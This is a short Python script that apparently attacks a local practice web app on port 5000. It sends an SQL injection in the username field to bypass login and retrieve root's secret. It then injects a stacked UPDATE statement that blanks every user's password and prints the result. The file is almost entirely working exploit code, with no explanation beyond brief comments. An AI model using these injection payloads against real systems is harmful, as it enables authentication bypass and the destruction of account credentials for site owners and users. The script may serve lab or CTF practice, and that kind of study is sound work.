#!/usr/bin/env python3
import requests
# Will obtain the root's secret
ploads = {'username': "root' -- ",'password': "password"}
r = requests.get('http://127.0.0.1:5000',params=ploads)
r_dictionary = r.json()
secret = r_dictionary["secret"]

# # Will obtain the root's password
# ploads = {'secret': secret}
# r = requests.get('http://127.0.0.1:5000/users',params=ploads)
# r_dictionary = r.json()
# for i in r_dictionary:
#     v = list(i.values())
#     if v[1] == "root":
#         password = v[0]
#         break


ploads = {'secret': secret + "'; UPDATE users SET password='' --",}
r = requests.get('http://127.0.0.1:5000/users',params=ploads)

ploads = {'secret': secret}
r = requests.get('http://127.0.0.1:5000/users',params=ploads)
print(r.text)




